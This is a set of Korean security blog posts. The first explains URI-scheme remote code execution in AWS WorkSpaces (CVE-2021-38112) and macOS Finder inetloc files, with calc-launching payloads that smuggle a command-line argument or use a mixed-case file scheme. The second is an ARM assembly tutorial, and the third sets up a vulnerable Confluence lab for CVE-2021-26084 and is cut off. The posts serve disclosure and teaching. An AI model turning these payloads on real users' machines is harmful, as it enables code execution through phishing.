[{"content":"요약   URI Scheme을 활용한 RCE 취약점이 최근 눈에 띄어, 흥미로워서 공유합니다.\n  사례1) AWS Workspace에서 사용하는 workspaces:// 스키마를 활용한 RCE 공격 (CVE-2021-38112)\n  사례2) 맥에서 inetloc 확장자 파일 내에서 file:// 스키마를 활용한 RCE 공격 (최초 제보자: 박민찬, 개인 연구자)\n    커스텀 URI Scheme 개발 시 파라미터를 통한 명령 실행 가능 여부를 늘 주의해야 하며, 로컬에서 임의 변경 후 실행 시 대응하기 어려운 클라이언트 프로그램의 구조적 한계를 고려하여 언제나 최소한의 기능만 처리할 수 있도록 최소 권한의 법칙(Principle of least privilege) 을 잊지 말아야 합니다.\n  내용 사례1. AWS Workspace RCE (CVE-2021-38112)  아래 취약점은 현재(2021-09-22) 패치가 완료 되었다고 합니다.\n AWS Workspace는 Citrix Workspace와 같은 데스크톱 가상화 서비스 입니다. 이 서비스를 이용하면 작업자가 언제 어디에서나 인터넷만 연결되어 있는 환경이라면 가상화된 PC에 접속하여 업무를 연속적으로 이어갈 수 있습니다. 특히 최근 COVID-19로 인한 재택근무 증가로 인해 이러한 데스크톱 가상화 서비스 사용량이 증가하고 있습니다.\n이 취약점을 최초로 제보한 Rhino Security Labs에서 해당 취약점에 대한 상세한 내용을 공개 하였습니다. 아래의 모든 내용은 링크의 내용을 바탕으로 작성되었으며, 링크에 상세 내용이 작성돼있으니 읽어 보는것을 추천드립니다!\n결론만 요약 하자면, 아래와 같습니다. Amawon Workspace를 사용하기 위해서는 데스크톱 클라이언트를 설치해야 하고, 웹을 통해 로그인 후 해당 클라이언트를 실행하기 위해 커스텀 프로토콜을 사용합니다. 커스텀 프로토콜 내 --gpu-launcher 파라미터를 통해서 Amazon Workspace 앱 실행 시 원하는 명령 실행(아래 예제에서는 calc.exe)이 가능합니다.\n최초에 웹 브라우저를 통해 아래의 명령어를 실행합니다. --gpu-launcher 파라미터에 calc.exe 명령을 주입했습니다.\nworkspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE 위의 스키마를 통해 실제 프로그램이 실행 될 때 아래의 명령어가 실행됩니다. 최초에 우리가 입력했던 파라미터들이 인코딩 된 채로 그대로 uri에 전달됨을 확인할 수 있습니다.\n\u0026quot;C:\\Program Files (x86)\\Amazon Web Services, Inc\\Amazon WorkSpaces\\workspaces.exe\u0026quot; --uri “workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE” 그 후 인코딩된 파라미터를 디코딩하여 프로그램이 두 번째 실행을 합니다. 아래 명령어에 --gpu-launcher=\u0026quot;calc.exe\u0026quot; 가 포함된 것을 확인할 수 있습니다.\n\u0026quot;C:\\Program Files (x86)\\Amazon Web Services, Inc\\Amazon WorkSpaces\\workspaces.exe\u0026quot; --ws-pipe-name UUID --ws-pipe-handle 4576 -r REGISTRATION_CODE --auth-url https://\u0026lt;appssite\u0026gt;.awsapps.com:443/login/?client_id=\u0026lt;clientid\u0026gt;\u0026amp;redirect_uri=https%3a%2f%2fskylight.local\u0026amp;locale=en_US --org-name \u0026lt;org name\u0026gt; --session-id \u0026lt;session id\u0026gt; --metricAppName Client -u anything --gpu-launcher=\u0026quot;calc.exe\u0026quot; --login-mode 5 위 명령이 실행되면 실제 calc.exe가 실행됩니다. 실행되는 화면은 위 글의 원문(Rhino Security Labs)에 가시면 보실 수 있습니다!\n사례2. macOS Finder RCE  아래 취약점은 패치를 하였으나, 여전히 File 스키마를 대소문자 혼용(FiLe://)하는 방법으로 패치를 우회가 가능하다고 합니다. (2021-09-22)\n 맥에는 inetloc 확장자 파일이 존재하는데, 해당 확장자는 맥의 Finder 혹은 사파리에서 URL 바로가기와 같이 특정 URL 호출 시 사용하는 확장자라고 합니다. 과거에는 종종 사용됐던거 같은데, 최근에는 많이 사용되는 것 같지는 않습니다(요즘도 자주 활용되는 사례를 알고 계신다면, 공유 부탁드립니다!).\n취약점 제보자 분이 공유한 페이로드를 활용하여 실제 작동 하는지 확인 결과, 더블클릭해서 파일 실행 시 바로 계산기 앱이 뜨는 것을 확인 했습니다. 테스트에 사용한 맥은 최신 버전 (macOS 11.6 21G165)이었으므로, 최신 버전에서 아직 패치가 미흡한 것을 확인했습니다.\n코드를 살펴 보면, File 스키마를 활용하여 바로 계산기 앱을 호출했습니다. File 스키마를 사용하여 기기 내의 파일을 접근, 실행 할 수 있으므로 맥을 사용하는 특정 타겟을 대상으로 스피어 피싱을 할 때 악용될 가능성이 있어 보입니다.\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026quot;-//Apple//DTD PLIST 1.0//EN\u0026quot; \u0026quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026quot;\u0026gt; \u0026lt;plist version=\u0026quot;1.0\u0026quot;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;URL\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;FiLe:////////////////////////System/Applications/Calculator.app\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; 결론 개발자 관점  URI Scheme 개발 시 파라미터를 통한 의도치 않은 기능 수행(임의의 명령 실행 가능 여부 등)가능성을 늘 주의해야 함 파라미터 임의 변경 후 주입 시 대응하기 어려운 클라이언트 프로그램의 구조적 한계를 고려하여 언제나 최소한의 기능만 동작할 수 있도록 최소 권한의 법칙(Principle of least privilege) 을 잊지 말아야 함  침투 테스터 관점  URI Scheme가 존재할 경우 들어가는 파라미터를 면밀히 분석하여, 악용할 수 있는 여지가 있는지 확인해야 함(특히 파라미터에 직접적으로 실행할 프로그램을 입력하는 구조라면 더욱 수상하니 반드시 확인할 것!) 악용할 여지가 있다면 악성 페이로드를 포함한 URI Scheme을 사용자가 실행할 수 있도록 유도할 수 있는 방법을 찾아보기  참고 문서   CVE-2021-38112: AWS WorkSpaces Remote Code Execution\n  macOS Finder RCE\n  ","permalink":"https://deguru22.github.io/2021/09/22/uri-scheme%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B3%B5%EA%B2%A9-aws-workspace-rce-macos-finder-rce/","summary":"요약   URI Scheme을 활용한 RCE 취약점이 최근 눈에 띄어, 흥미로워서 공유합니다.\n  사례1) AWS Workspace에서 사용하는 workspaces:// 스키마를 활용한 RCE 공격 (CVE-2021-38112)\n  사례2) 맥에서 inetloc 확장자 파일 내에서 file:// 스키마를 활용한 RCE 공격 (최초 제보자: 박민찬, 개인 연구자)\n    커스텀 URI Scheme 개발 시 파라미터를 통한 명령 실행 가능 여부를 늘 주의해야 하며, 로컬에서 임의 변경 후 실행 시 대응하기 어려운 클라이언트 프로그램의 구조적 한계를 고려하여 언제나 최소한의 기능만 처리할 수 있도록 최소 권한의 법칙(Principle of least privilege) 을 잊지 말아야 합니다.","title":"URI Scheme을 활용한 공격 - AWS Workspace RCE, macOS Finder RCE"},{"content":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-4/)\n ARM은 메모리 접근 시 오직 불러오기-저장(load-store, LDR and STR) 명령만을 사용 하도록 하는 불러오기-저장 모델을 사용합니다. x86에서 대부분의 명령들은 직접 메모리 안의 데이터를 접근하는 것과 달리, ARM에서는 데이터는 반드시 처리 전에 레지스터로 불러오는 과정을 거쳐야 합니다. 이 말인 즉슨 특정 메모리에 올라와 있는 32-bit 값을 ARM에서 증가 시키려면 3개의 명령어(불러오기, 증가하기, 저장)를 실행 해야 한다는 이야기 입니다.\nARM에서의 불러오기와 저장 명령의 기본을 설명하기 전에, 기본적인 예제들과 세가지 오프셋 폼, 그리고 각각의 오프셋 폼 별 존재하는 세가지 주소 모드를 배울겁니다. 각각의 예제에서는 같은 어셈블리 명령어에 다른 LDR/STR 오프셋 폼을 사용하여 단순하게 할것입니다. 이 튜토리얼을 잘 이해하기 위해서는 GDB에서 직접 실행해 보면 좋습니다.\n\u0026lt;정리\u0026gt;\n 오프셋 폼: 직접 입력한 값을 오프셋으로  주소 모드: 오프셋 주소 모드: Pre-Indexed 주소 모드: Post-Indexed   오프셋 폼: 레지스터를 오프셋으로  주소 모드: 오프셋 주소 모드: Pre-Indexed 주소 모드: Post-Indexed   오프셋 폼: 스케일된 레지스터를 오프셋으로  주소 모드: 오프셋 주소 모드: Pre-Indexed 주소 모드: Post-Indexed    첫 번째 단순한 예제 일반적으로 LDR은 메모리에서 레지스터로 값을 불러올 때 사용하며, STR은 레지스터의 값을 특정 메모리 주소에 저장할 때 사용합니다.\nLDR R2, [R0] @ [R0] - R0의 값이 메모리 주소 STR R2, [R1] @ [R1] - R1의 값이 메모리 주소  LDR 명령어: R0가 갖고있는 메모리 주소에 위치하고 있는 값을 R2에 저장 STR 명령어: R2가 갖고있는 값을 메모리에 저장  어셈블리 프로그램으로 작성한 프로그램은 아래와 같습니다.\n.data /* .data section 은 자동으로 생기며 위치를 알기 매우 쉬움 */ var1: .word 3 /* 메모리 안에 있는 variable 1 */ var2: .word 4 /* 메모리 안에 있는 variable 2 */ .text /* 코드 섹션 시작점 */ .global _start _start: ldr r0, adr_var1 @ var1 메모리 주소를 label adr_var1 통해 R0에 저장 ldr r1, adr_var2 @ var2 메모리 주소를 label adr_var2 통해 R1에 저장 ldr r2, [r0] @ R0에서 가져온 값(0x03)을 R2 위치에 저장 str r2, [r1] @ R2에서 가져온 값(0x03)을 R1 위치에 저장 bkpt adr_var1: .word var1 /* var1 주소 저장 */ adr_var2: .word var2 /* var2 주소 저장 */ 위 코드의 아래쪽에 우리의 리터럴 풀(Literal Pool, 코드 섹션과 동일한 메모리 공간으로 상수, 문자열, 오프셋 등을 포지션과 관계없이 저장 및 사용하기 위해 사용)이 있는데, data 섹션에 있는 var1과 var2의 메모리 주소를 저장하기 위해 사용했습니다. var1, var2의 값이 저장된 주소를 adr_var1, adr_var2로 저장했습니다. 첫번째 LDR은 var1의 주소를 레지스터 R0에 저장합니다. 두번째 LDR은 var2의 주소를 레지스터 R1에 저장합니다. 그 후 R0에 저장된 메모리 주소를 통해 해당 메모리에 저장되어 있는 값을 R2에 불러옵니다. R2에 불러온 값은 R1에 저장되어있는 메모리 주소에 기록합니다.\n우리가 레지스터에 뭔가를 불러올 때, 중괄호([ ])의 의미는 우리가 뭔가를 불러오기 위한 메모리 주소를 뜻합니다.\n우리가 뭔가를 메모리 주소에 저장할 때, 중괄호([ ])의 의미는 우리가 뭔가를 저장할 때 사용할 메모리 주소를 뜻합니다.\n이러한 내용들이 실제 내용보다 복잡해 보이니까, 텍스트가 아닌 구체적인 사례를 보면서 어떻게 메모리에서 값을 불러오고 저장하는지 알아봅시다.\n같은 코드를 디버거에서 보면 아래와 같습니다.\ngef\u0026gt; disassemble _start Dump of assembler code for function _start: 0x00008074 \u0026lt;+0\u0026gt;: ldr r0, [pc, #12] ; 0x8088 \u0026lt;adr_var1\u0026gt; 0x00008078 \u0026lt;+4\u0026gt;: ldr r1, [pc, #12] ; 0x808c \u0026lt;adr_var2\u0026gt; 0x0000807c \u0026lt;+8\u0026gt;: ldr r2, [r0] 0x00008080 \u0026lt;+12\u0026gt;: str r2, [r1] 0x00008084 \u0026lt;+16\u0026gt;: bx lr End of assembler dump. 위 두 개의 LDR 명령을 보면, 레이블들이 [pc, #12]로 바뀌었습니다. 이러한 형태를 PC-관련 주소(PC-Relative addressing)라고 합니다. 우리가 레이블을 사용했기때문에 컴파일러가 리터럴 풀에서 값을 특정할 수 있습니다(PC+12). 이 값을 직접 계산할 수도 있고, 아니면 레이블을 사용할 수도 있습니다. 두 개의 유일한 차이점은, 당신이 수동으로 포지션을 계산 하느냐 마느냐 입니다. PC-관련 주소에 대한 자세한 내용은 이 챕터의 아래쪽에서 다루도록 하겠습니다.\n추가 노트: 만약 왜 effective PC가 현재의 PC에서 왜 2개의 명령어를 앞서 있는지를 까먹었다면, Part 2를 복습하세요. 복습하기 귀찮다면\u0026hellip; PC는 현재 주소에서 더하기 8(ARM 기준) 혹은 4(Thumb 기준)해서 저장되기 때문입니다.\n1. 오프셋 폼: 값을 직접 오프셋으로 사용 STR Ra, [Rb, imm] LDR Ra, [Rc, imm] 위의 예제는 값(숫자)을 직접 오프셋으로 사용하는 경우입니다. 해당 값을 베이스 레지스터에서 더하거나 뺀 후 메모리 접근 시 사용합니다. 오프셋 값은 컴파일 시 결정됩니다.\n.data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ var1의 메모리 주소를 adr_var1에서 가져와서 R0에 저장 ldr r1, adr_var2 @ var2의 메모리 주소를 adr_var2에서 가져와서 R1에 저장 ldr r2, [r0] @ R0에 저장된 메모리 주소 저장돼 있는 값(0x03)을 R2에 저장 str r2, [r1, #2] @ 주소 모드: R2에 저장된 값(0x03)을 R1에 저장된 메모리 값 + 2 위치에 저장함. 베이스 레지스터(R1) 값에는 변동 없음 str r2, [r1, #4]! @ 주소 모드: pre-indexed. R2에 저장된 값(0x03)을 R1에 저장된 메모리 값 + 4에 저장함. 베이스 레지스터(R1) 변동: R1 = R1+4 ldr r3, [r1], #4 @ 주소 모드: post-indexed. R1에 저장된 메모리 주소 내의 값을 R3에 저장함. 베이스 레지스터(R1) 변경됨: R1=R1+4 bkpt adr_var1: .word var1 adr_var2: .word var2 위 프로그램을 ldr.s로 저장하고 컴파일 후 GDB에서 실행하면 어떻게 되는지 봅시다.\n$ as ldr.s -o ldr.o $ ld ldr.o -o ldr $ gdb ldr GDB(gef 설치된 버전)에서 _start에 breakpoint를 걸고 프로그램을 실행해 봅시다.\ngef\u0026gt; break _start gef\u0026gt; run ... gef\u0026gt; nexti 3 /* 다음 3개 명령 실행 */ 레지스터들이 아래 값으로 채워진 것을 확인할 수 있습니다(값은 시스템 별로 상이할 수 있으니 참고하세요).\n$r0 : 0x00010098 -\u0026gt; 0x00000003 $r1 : 0x0001009c -\u0026gt; 0x00000004 $r2 : 0x00000003 $r3 : 0x00000000 $r4 : 0x00000000 $r5 : 0x00000000 $r6 : 0x00000000 $r7 : 0x00000000 $r8 : 0x00000000 $r9 : 0x00000000 $r10 : 0x00000000 $r11 : 0x00000000 $r12 : 0x00000000 $sp : 0xbefff7e0 -\u0026gt; 0x00000001 $lr : 0x00000000 $pc : 0x00010080 -\u0026gt; \u0026lt;_start+12\u0026gt; str r2, [r1] $cpsr : 0x00000010 다음에 실행될 명령어는 오프셋 주소 모드의 STR 명령입니다. 이 명령은 R2의 값(0x3)을 R1이 저장하고 있는 메모리 주소(0x1009c) + 오프셋(#2) = 0x1009e 위치에 저장할 것입니다.\ngef\u0026gt; nexti gef\u0026gt; x/w 0x1009e 0x1009e \u0026lt;var2+2\u0026gt;: 0x3 다음 STR 명령은 pre-indexed 주소 모드를 사용합니다. 이 모드 적용 여부는 느낌표(!)를 통해 알 수 있습니다. 이 모드의 다른점은 베이스 레지스터가 R2의 값이 저장될 최종 메모리 주소로 업데이트 된다는 점입니다. 이 말인 즉슨, 우리는 R2에 저장된 값(0x3)을 R1이 가지고 있는 메모리 주소(0x1009c) + 오프셋(#4) = 0x100A0에 저장하고, R1을 이 주소(0x100A0)로 업데이트 한다는 것이죠.\ngef\u0026gt; nexti gef\u0026gt; x/w **0x100A0** **0x100a0**: 0x3 gef\u0026gt; info register r1 r1 **0x100a0** 65696 마지막 LDR 명령은 post-indexed 주소 모드를 사용합니다. 이 모드는 베이스 레지스터(R1)을 최종 주소로 사용하고, 오프셋을 계산(R1+4) 후 해당 값을 업데이트 합니다. 이 말인 즉슨, R1+4가 아니라 R1(0x100A0)에 저장된 값을 찾아서 R3에 불러옵니다. 그 후 R1을 R1(0x100A0) + 오프셋(#4) = 0x100A4 로 업데이트 합니다.\ngef\u0026gt; info register r1 r1 **0x100a4** 65700 gef\u0026gt; info register r3 r3 **0x3** 3 아래에 위 과정을 그림으로 표현해 보았습니다.\n2. 오프셋 폼: 레지스터를 오프셋으로 사용 STR Ra, [Rb, **Rc**] LDR Ra, [Rb, **Rc**] 이 오프셋 폼은 레지스터를 오프셋으로 사용합니다. 이러한 오프셋 폼은 코드 내에서 런타임에 인덱스를 계산해서 배열을 접근할 때 사용합니다.\n.data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ adr_var1에 저장된 var1의 메모리 주소를 R0에 저장 ldr r1, adr_var2 @ adr_var2에 저장된 var2의 메모리 주소를 R1에 저장 ldr r2, [r0] @ R0에 저장된 메모리 주소에서 가져온 값(0x03)을 Offset R2에 저장 str r2, [r1, r2] @ 주소 모드: 오프셋. R2에 저장된 값(0x03)을 R1에 저장된 메모리 주소에 오프셋 R2(0x03)을 포함하여 저장. 베이스 레지스터 변동 없음. str r2, [r1, r2]! @ 주소 모드: pre-indexed. R2에 저장된 값(0x03)을 R1에 저장된 메모리 주소에 오프셋 R2(0x03)을 포함하여 저장. 베이스 레지스터 변경: R1=R1+R2 ldr r3, [r1], r2 @ 주소 모드: post-indexed. R1에 저장된 메모리 주소에 존재하는 값을 R3에 불러옴. 베이스 레지스터 변동: R1=R1+R2 bx lr adr_var1: .word var1 adr_var2: .word var2 오프셋 주소 모드로 첫번째 STR 명령을 실행 하면, R2의 값 (0x3)이 메모리 주소(0x1009c + 0x3 = 0x1009F)에 저장됨\ngef\u0026gt; x/w 0x0001009F 0x1009f \u0026lt;var2+3\u0026gt;: 0x00000003 두 번째 STR 명령은 pre-indexed 주소 모드로 위와 같은 결과를 가지지만, 차이점은 베이스 레지스터(R1)을 계산한 메모리 값(R1+R2)으로 변경 하는 점이 있습니다.\ngef\u0026gt; info register r1 r1 **0x1009f** 65695 마지막 LDR 명령은 post-indexed 주소 모드로 R1에서 찾은 메모리 주소의 값을 R2로 불러온 후에 베이스 레지스터 R1을 업데이트(R1+R2 = 0x1009f + 0x3 = 0x100a2) 합니다.\ngef\u0026gt; info register r1 r1 0x100a2 65698 gef\u0026gt; info register r3 r3 0x3 3 3. 오프셋 폼: 스케일된 레지스터를 오프셋으로 사용 LDR Ra, [Rb, **Rc, \u0026lt;shifter\u0026gt;**] STR Ra, [Rb, **Rc, \u0026lt;shifter\u0026gt;**] 세 번째 오프셋 폼은 스케일된 레지스터를 오프셋으로 가집니다. 위의 폼에서 Rb는 베이스 레지스터이고 Rc는 직접 값 오프셋(혹은 값을 가진 레지스터)을 기반으로 오른쪽/왼쪽 쉬프팅된() 값입니다. 이 말인 즉슨, 배럴 쉬프터가 오프셋 스케일링에 사용됐다는 이야기 입니다. 이 오프셋을 사용하는 예는 배열 값을 순차적으로 접근할 때 입니다. 아래에 GDB를 통해 실행하는 예제를 참고해 주세요.\n.data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 ldr r1, adr_var2 ldr r2, [r0] str r2, [r1, r2, LSL#2] str r2, [r1, r2, LSL#2]! ldr r3, [r1], r2, LSL#2 bkpt adr_var1: .word var1 adr_var2: .word var2 첫번째 STR 명령은 오프셋 주소 모드를 사용하여 R2 내의 값을 특정 메모리 주소([r1, r2, LSL#2] 연산 결과)에 기록합니다. 메모리 주소를 계산해 보면, R1의 값을 베이스로 사용(이 경우에는 R1에 var2의 주소값이 들어 있음)하고, R2의 값(0x3)을 가져와서 왼쪽으로 2번 쉬프팅을 합니다. 아래 그림을 통해 어떻게 메모리 주소가 계산되는지 보겠습니다.\n두번째 STR 명령은 pre-indexed 주소 모드를 사용합니다. 이 말은, 이전 명령과 동일한 명령을 수행하지만, 다른점은 R1을 계산한 메모리 주소 값으로 변경하는 점입니다. 다른 말로 얘기하자면, 메모리 주소(R1(0x1009c) + 왼쪽 오프셋으로 #2만큼 옮겨진(0x03 LSL#2 = 0xC) = 0x100a8)에 값을 저장한 후 R1을 0x100a8로 업데이트 합니다.\ngef\u0026gt; info register r1 r1 **0x100a8** 65704 마지막 LDR 명령은 post-indexed 주소 모드를 사용합니다. 이 말은, R1(0x100a8)에 저장된 메모리 주소 내의 값을 R3에 저장한 후 베이스 레지스터인 R1을 계산한 값(R1(0x100a8) + R2 오프셋(0x3)을 왼쪽으로 #2 만큼 쉬프팅한 값 (0xC)=0x100b4) 으로 변경합니다.\ngef\u0026gt; info register r1 r1 **0x100b4** 65716 정리 LDR/STR에는 세가지의 오프셋 모드가 있습니다.\n 직접 값을 오프셋으로 사용하는 경우  ldr r3, [r1, #4]   레지스터를 오프셋으로 사용하는 경우  ldr r3, [r1, r2]   스케일된 레지스터를 오프셋으로 사용하는 경우  ldr r3, [r1, r2, LSL#2]    LDR/STR의 다양한 모드를 기억하는 방법은 아래와 같습니다.\n 만약 **!**가 있다면 prefix 주소 모드  ldr r3, [r1, #4]! ldr r3, [r1, r2]! ldr r3, [r1, r2, LSL#2]!   만약 **베이스 레지스터가 **로 감싸져 있다면, postfix 주소 모드  ldr r3, [r1], #r ldr r3, [r1], r2 ldr r3, [r1], r2, LSL#2   다른거는 오프셋 주소 모드  ldr r3, [r1, #4] ldr r3, [r1, r2] ldr r3, [r1, r2, LSL#2]    PC 기반 주소의 LDR LDR은 단순히 메모리의 값을 레지스터로 옮기는데만 사용되지 않습니다. 가끔 아래와 같은 문법을 볼 수 있는데요\u0026hellip;\n.section .text .global _start _start: ldr r0, =jump /* load the address of the function label jump into R0 */ ldr r1, =0x68DB00AD /* load the value 0x68DB00AD into R1 */ jump: ldr r2, =511 /* load the value 511 into R2 */ bkpt 이러한 명령어들은 \u0026ldquo;의사 명령어(pseudo-instructions)\u0026rdquo; 라고 부릅니다. 우리는 이 명령어 문법을 리터럴 풀에 있는 데이터를 참조하기 위해 사용합니다. 리터럴 풀은 같은 섹션에 있는 메모리 공간(왜냐하면 리터럴 풀은 코드의 일부이기 때문입니다)으로, 상수나 문자열, 오프셋 등을 저장하기 위해 사용합니다. 위의 예제에서는 의사 명령어를 사용해서 함수의 오프셋을 참조하기 위해 사용하고, 하나의 명령을 통해 32-bit 상수를 레지스터로 옮기는데에 사용됩니다. 왜냐하면 ARM은 8-bit 값만 한번에 불러올 수 있기 때문입니다. 뭐라고요?! 왜 그런지를 이해하기 위해서는, 어떻게 ARM이 값(Immediate Values)을 핸들링 하는지 알아야 합니다.\nARM에서의 값(Immediate Values) 사용 ARM 에서 레지스터에 값을 로드하는 것은 x86처럼 직관적이지 않습니다. 값을 사용할 때 제약사항이 있습니다. 어떠한 제약사항이 있으며 어떻게 해결 해야하는지가 ARM 어셈블리의 가장 재밌는 부분이며, 이러한 제약 사항을 어떻게 해결해야 하는지에 대한 팁들을 아래에 기술해 두었습니다(힌트: LDR).\n우리는 각각의 ARM 명령어가 32-bit인걸 알고 있으며, 모든 명령어는 조건기반입니다. 16개의 조건 코드가 있으며, 하나의 조건 코드는 4 비트의 명령을 할당 받을 수 있습니다. 그 후 남는 2비트는 결과 레지스터로 사용하고, 2비트는 첫번째 인자 레지스터로 사용하고, 1비트는 상태값 플래그이며, 그 외에 비트는 실제 인자값 등으로 사용합니다. 중요한 것은, 비트를 명령어, 레지스터, 다른 필드 등으로 설정한 뒤에 오직 12비트만 값을 쓰기 위해 남는다는 점입니다. 12 비트이니 총 4096개의 다른 값을 가질 수 있습니다.\n이 말인 즉슨 ARM 명령은 제한적인 값만을 MOV를 통해 직접 사용할 수 있다는 점입니다. 만약 숫자를 직접 사용할 수 없다면, 파트로 나누어서 여러 작은 숫자를 사용해야 할 것입니다.\n하지만 여기에 더 나아가서 생각해 보면, 12비트를 단순 숫자로 사용하지 말고, 12비트를 8비트 숫자로 나눈 후 4비트 로테이션 필드(r)을 사용해서 오른쪽으로 로테이션을 해서 사용할 수도 있겠죠. 이걸 공식화 하면 이렇습니다: v = n ror 2*r. 이 공식을 사용한다면 실제 값은 오직 로테이션된 값(짝수)일 것입니다.\n아래에 이러한 값들에 대한 예제입니다.\nValid values: #256 // 1 ror 24 --\u0026gt; 256 #384 // 6 ror 26 --\u0026gt; 384 #484 // 121 ror 30 --\u0026gt; 484 #16384 // 1 ror 18 --\u0026gt; 16384 #2030043136 // 121 ror 8 --\u0026gt; 2030043136 #0x06000000 // 6 ror 8 --\u0026gt; 100663296 (0x06000000 in hex)  Invalid values: #370 // 185 ror 31 --\u0026gt; 31 is not in range (0 – 30) #511 // 1 1111 1111 --\u0026gt; bit-pattern can’t fit into one byte #0x06010000 // 1 1000 0001.. --\u0026gt; bit-pattern can’t fit into one byte 위의 예제를 볼 때, 전체 32bit 주소를 한번에 사용하는 것은 불가능은 아니라는 결론에 도달합니다. 우리는 아래 두 가지 옵션 중 한 가지 옵션을 충족 한다면 표현의 제한을 우회할 수 있습니다.\n 큰 값을 작은 파트를 통해 표현할 수 있음  MOV r0, #511 사용 대신 511을 두개의 파트로 나눠서 사용: MOV r0, #256과 ADD r0, #255   ldr r1,=value를 사용해서 값을 불러올 수 있는 경우. 그러니까 MOV나 PC-연관 불러오기가 불가능하지 않은 경우입니다.  LDR r1, =511    만약 불가능한 숫자를 어셈블러를 통해 불러오려고 한다면 Error: Invalid Constant 라는 문구와 함께 에러가 발생할 것입니다. 만약 이 에러가 발생한다면, 어떤 뜻인지 알고 뭘 해야하는지 알겠죠. 만약에 #511을 R0에 불러오고 싶다고 생각해 봅시다.\n.section .text .global _start _start: mov r0, #511 bkpt 만약 이 코드를 어셈블리어로 변경하면, 어셈블러는 에러를 출력할 것입니다.\nazeria@labs:~$ as test.s -o test.o test.s: Assembler messages: test.s:5: Error: invalid constant (1ff) after fixup 이러한 에러가 날 경우 511을 여러 파트로 쪼개서 사용하거나, LDR을 위에서 설명한 것 처럼 사용하면 됩니다.\n.section .text .global _start _start: mov r0, #256 /* 1 ror 24 = 256, so it\u0026#39;s valid */ add r0, #255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */ ldr r1, =511 /* load 511 from the literal pool using LDR */ bkpt 만약 특정 숫자가 사용 가능한 값인지 확인하기 위해서는 직접 계산할 필요 없이 저자가 작성한 rotater.py를 사용해서 확인할 수 있습니다.\nazeria@labs:~$ python rotator.py Enter the value you want to check: 511 Sorry, 511 cannot be used as an immediate number and has to be split. azeria@labs:~$ python rotator.py Enter the value you want to check: 256 The number 256 can be used as a valid immediate number. 1 ror 24 --\u0026gt; 256 ","permalink":"https://deguru22.github.io/2021/09/19/arm-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%ED%8A%9C%ED%86%A0%EB%A6%AC%EC%96%BC-4-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%AA%85%EB%A0%B9%EC%96%B4-%EB%B6%88%EB%9F%AC%EC%98%A4%EA%B8%B0-%EB%B0%8F-%EC%A0%80%EC%9E%A5/","summary":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-4/)\n ARM은 메모리 접근 시 오직 불러오기-저장(load-store, LDR and STR) 명령만을 사용 하도록 하는 불러오기-저장 모델을 사용합니다. x86에서 대부분의 명령들은 직접 메모리 안의 데이터를 접근하는 것과 달리, ARM에서는 데이터는 반드시 처리 전에 레지스터로 불러오는 과정을 거쳐야 합니다. 이 말인 즉슨 특정 메모리에 올라와 있는 32-bit 값을 ARM에서 증가 시키려면 3개의 명령어(불러오기, 증가하기, 저장)를 실행 해야 한다는 이야기 입니다.","title":"ARM 어셈블리 튜토리얼 (4) 메모리 명령어: 불러오기 및 저장"},{"content":"요약   컨플루언스에서 권한 없이 원격 명령 실행 가능한 취약점 발생, 해당 취약점 패치 배포 완료 (2021-08-25)\n  OGNL(Object Graph Navigation Language) 취약점을 이용한 것으로, 이전에 발견된 Apache Struts2 (CVE-2017-5638)과 유사한 취약점. Velocity 지시자 파라미터는 = 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생함\n  해당 취약점을 활용한 exploit code가 공개되어있고, 권한 없는 사용자도 원격 실행이 가능하므로 빠른 패치가 필요함\n  이 문서에서는 아래 내용을 다룹니다   docker-compose 를 통한 취약점 재현 환경 설정 및 실습\n  공개된 exploit code 분석\n  실제 패치 내용 분석\n  취약점 정보  공식 Advisory : Confluence Security Advisory 2021-08-25  버전 정보  패치 완료된 버전 : 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0  취약한 URL 및 파라미터    URL 파라미터 로그인 하지 않고 공격 가능 비고     /pages/createpage-entervariables querystring O 로그인 없이 가능   /login.action token △ 회원 가입이 활성화 되어 있어야 함 (기본 비활성화)   /users/user-dark-features featureKey X 추가 기능 사용을 위한 페이지, 관리자의 허용 설정 필요   /pages/templates2/viewpagetemplate.action querystring, linkCreation X    /templates/editor-preload-containers syncRev X    /template/custom/content-editor sourceTemplateId* X     공개된 PoC   h3v0x/CVE-2021-26084_Confluence\n  alt3kx/CVE-2021-26084_POC\n  취약점 실습 환경 구성 취약한 버전 컨플루언스 구동 docker-compose를 활용해서 컨플루언스를 구동해 봅시다. docker-compose 사용을 위해서는 docker desktop 설치가 필요합니다. 이 튜토리얼에서는 취약한 버전 7.12.4 버전을 기준으로 합니다.\ndocker-compose.yml version: \u0026#39;3\u0026#39; services: confluence: image: atlassian/confluence-server:7.12.4 environment: - ATL_JDBC_URL=jdbc:postgresql://db:5432/confluence - ATL_JDBC_USER=confluence - ATL_JDBC_PASSWORD=donotuseinproduction - ATL_DB_DRIVER=org.postgresql.Driver - ATL_DB_TYPE=postgresql ports: - 8090:8090 depends_on: - db restart: always db: image: postgres:11 environment: - POSTGRES_PASSWORD=donotuseinproduction - POSTGRES_USER=confluence - POSTGRES_DB=confluence restart: always 위의 compose 파일 생성 후 아래 명령어로 confluence를 실행해 줍니다.\n$ docker-compose up 실행 후에 Trial license를 등록하고, 아래쪽에 버전 